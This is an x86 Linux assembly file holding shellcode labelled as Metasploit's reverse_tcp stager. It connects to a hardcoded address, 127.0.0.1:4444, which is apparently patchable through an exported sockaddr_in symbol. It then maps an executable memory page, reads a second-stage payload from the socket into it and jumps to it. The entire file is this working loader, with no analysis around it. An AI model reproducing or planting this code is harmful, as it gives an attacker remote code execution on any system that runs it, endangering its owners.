#include <asm/unistd.h>

.globl reverse_tcp
.globl reverse_tcp_end
.globl sockaddr_in

#
# reverse_tcp from metasploit
#
reverse_tcp:
xor    %ebx,%ebx
push   %ebx
inc    %ebx
push   %ebx
push   $0x2
push   $__NR_socketcall
pop    %eax
mov    %esp,%ecx
int    $0x80
xchg   %eax,%edi
pop    %ebx
sockaddr_in:
push   $0x100007f
pushw  $0x5c11
push   %bx
mov    %esp,%ecx
push   $__NR_socketcall
pop    %eax
push   %eax
push   %ecx
push   %edi
mov    %esp,%ecx
inc    %ebx
int    $0x80

# mmap anonymous

xorl   %eax,%eax
movl   %eax,20(%esp)
movl   $0xffffffff,16(%esp)
movl   $0x21,12(%esp)
movl   $0x7,8(%esp)
movl   $0x1000,4(%esp)
movl   %eax,0(%esp)
movl   %esp,%ebx
movl   $0x5a,%eax
int    $0x80

mov    %eax,%ecx
mov    %edi,%ebx
xor    %edx,%edx
mov    $0xc,%dh
mov    $__NR_read,%eax
int    $0x80
jmp    *%ecx
reverse_tcp_end:
